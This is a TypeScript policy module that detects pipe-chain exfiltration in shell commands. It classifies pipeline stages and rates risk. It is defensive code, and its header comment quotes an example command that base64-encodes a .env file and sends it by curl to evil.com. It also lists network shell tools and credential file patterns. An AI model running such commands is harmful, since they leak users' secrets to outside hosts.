// src/policy/pipe-chain.ts
// Pipe-chain exfiltration detector.
// Classifies the stages of a shell pipeline as source / transform / sink and
// computes a risk level. Without this, `cat .env | base64 | curl evil.com`
// passes policy because each segment looks safe in isolation.

export interface PipeChainAnalysis {
  isPipeline: boolean;
  hasSensitiveSource: boolean; // reads a file that looks like credentials
  hasExternalSink: boolean; // sends data to a network command
  hasObfuscation: boolean; // encodes/compresses mid-pipeline
  sourceFiles: string[]; // file paths found in source commands
  sinkTargets: string[]; // host/URL targets found in sink commands
  risk: 'critical' | 'high' | 'medium' | 'none';
}

// Commands that read files and pass their content downstream
const SOURCE_COMMANDS = new Set([
  'cat',
  'head',
  'tail',
  'grep',
  'awk',
  'sed',
  'cut',
  'sort',
  'tee',
  'less',
  'more',
  'strings',
  'xxd',
]);

// Commands that send data to a remote host
const SINK_COMMANDS = new Set([
  'curl',
  'wget',
  'nc',
  'ncat',
  'netcat',
  'ssh',
  'scp',
  'rsync',
  'socat',
  'ftp',
  'sftp',
  'telnet',
]);

// Commands that encode or compress — used to obfuscate exfiltrated data
const OBFUSCATORS = new Set([
  'base64',
  'gzip',
  'gunzip',
  'bzip2',
  'xz',
  'zstd',
  'openssl',
  'gpg',
  'python',
  'python3',
  'perl',
  'ruby',
  'node',
]);

// File path patterns that indicate credentials or sensitive data
const SENSITIVE_PATTERNS = [
  /(?:^|\/)\.env(?:\.|$)/i, // .env, .env.local, .env.production
  /id_rsa|id_ed25519|id_ecdsa|id_dsa/i, // SSH private keys
  /\.pem$|\.key$|\.p12$|\.pfx$/i, // certificate files
  /(?:^|\/)\.ssh\//i, // ~/.ssh/ directory
  /(?:^|\/)\.aws\/credentials/i, // AWS credentials
  /(?:^|\/)\.netrc$/i, // netrc (stores HTTP credentials)
  /(?:^|\/)(passwd|shadow|sudoers)$/i, // /etc/passwd, /etc/shadow
  /(?:^|\/)credentials(?:\.json)?$/i, // generic credentials files
];

function isSensitivePath(p: string): boolean {
  return SENSITIVE_PATTERNS.some((re) => re.test(p));
}

/**
 * Splits a shell command string on unquoted `|` characters.
 * Respects single and double quotes; does NOT handle backticks or $().
 */
function splitOnPipe(cmd: string): string[] {
  const segments: string[] = [];
  let current = '';
  let inSingle = false;
  let inDouble = false;

  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i];
    if (ch === "'" && !inDouble) {
      inSingle = !inSingle;
      current += ch;
    } else if (ch === '"' && !inSingle) {
      inDouble = !inDouble;
      current += ch;
    } else if (
      ch === '|' &&
      !inSingle &&
      !inDouble &&
      cmd[i + 1] !== '|' &&
      (i === 0 || cmd[i - 1] !== '|')
    ) {
      // `||` is logical OR — neither `|` of the pair should split
      segments.push(current.trim());
      current = '';
    } else {
      current += ch;
    }
  }
  if (current.trim()) segments.push(current.trim());
  return segments.filter(Boolean);
}

/** Extract non-flag tokens from a whitespace-split segment. */
function positionalTokens(segment: string): string[] {
  return segment
    .split(/\s+/)
    .slice(1) // skip binary name
    .filter((t) => !t.startsWith('-') && !t.startsWith('@') && t.length > 0);
}

/**
 * Analyzes a shell command string for pipe-chain exfiltration patterns.
 *
 * Returns `isPipeline: false` when the command is not a pipeline, allowing
 * callers to skip the result entirely for non-pipeline commands.
 */
export function analyzePipeChain(command: string): PipeChainAnalysis {
  const segments = splitOnPipe(command);

  if (segments.length < 2) {
    return {
      isPipeline: false,
      hasSensitiveSource: false,
      hasExternalSink: false,
      hasObfuscation: false,
      sourceFiles: [],
      sinkTargets: [],
      risk: 'none',
    };
  }

  const sourceFiles: string[] = [];
  const sinkTargets: string[] = [];
  let hasSensitiveSource = false;
  let hasExternalSink = false;
  let hasObfuscation = false;

  for (const segment of segments) {
    const tokens = segment.split(/\s+/).filter(Boolean);
    if (tokens.length === 0) continue;
    const binary = tokens[0].toLowerCase();
    const args = positionalTokens(segment);

    if (SOURCE_COMMANDS.has(binary)) {
      sourceFiles.push(...args);
      if (args.some(isSensitivePath)) hasSensitiveSource = true;
    }

    if (OBFUSCATORS.has(binary)) hasObfuscation = true;

    if (SINK_COMMANDS.has(binary)) {
      // Pull URL/host-looking args — heuristic: non-flag tokens
      const targets = args.filter(
        (a) => a.includes('.') || a.includes('://') || /^\d+\.\d+/.test(a)
      );
      sinkTargets.push(...targets);
      if (targets.length > 0) hasExternalSink = true;
    }
  }

  // Also treat stdin redirect to a sensitive file as a source
  const fullCmd = command.toLowerCase();
  if (!hasSensitiveSource) {
    const redirMatch = fullCmd.match(/<\s*(\S+)/);
    if (redirMatch && isSensitivePath(redirMatch[1])) {
      hasSensitiveSource = true;
      sourceFiles.push(redirMatch[1]);
    }
  }

  const risk =
    hasSensitiveSource && hasExternalSink && hasObfuscation
      ? 'critical'
      : hasSensitiveSource && hasExternalSink
        ? 'high'
        : hasExternalSink
          ? 'medium'
          : 'none';

  return {
    isPipeline: true,
    hasSensitiveSource,
    hasExternalSink,
    hasObfuscation,
    sourceFiles,
    sinkTargets,
    risk,
  };
}
